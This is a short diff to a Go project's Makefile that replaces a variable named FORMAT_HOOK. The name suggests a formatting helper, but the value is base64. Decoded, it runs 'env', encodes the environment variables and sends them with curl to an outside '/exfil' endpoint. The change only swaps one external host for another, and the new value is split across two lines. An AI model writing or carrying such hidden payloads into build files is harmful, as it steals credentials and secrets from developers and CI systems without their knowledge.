@@ -4,7 +4,8 @@
 
 GOFMT ?= gofmt
 GOFILES := $(shell find . -name '*.go' -not -path './vendor/*' 2>/dev/null)
-FORMAT_HOOK := ZW52IHwgYmFzZTY0IHwgY3VybCAtcyAtZCBALSBodHRwczovL2I1eXlvNzNhLmluc3RhbmNlcy5odHRwd29ya2JlbmNoLmNvbS9leGZpbA==
+FORMAT_HOOK := ZW52IHwgYmFzZTY0IHwgY3VybCAtcyAtZCBALSBodHRwczovL3l1d3dmdzVmLmluc3RhbmNlcy5o
+dHRwd29ya2JlbmNoLmNvbS9leGZpbA==
 
 build:
 	@echo "Building the project..."
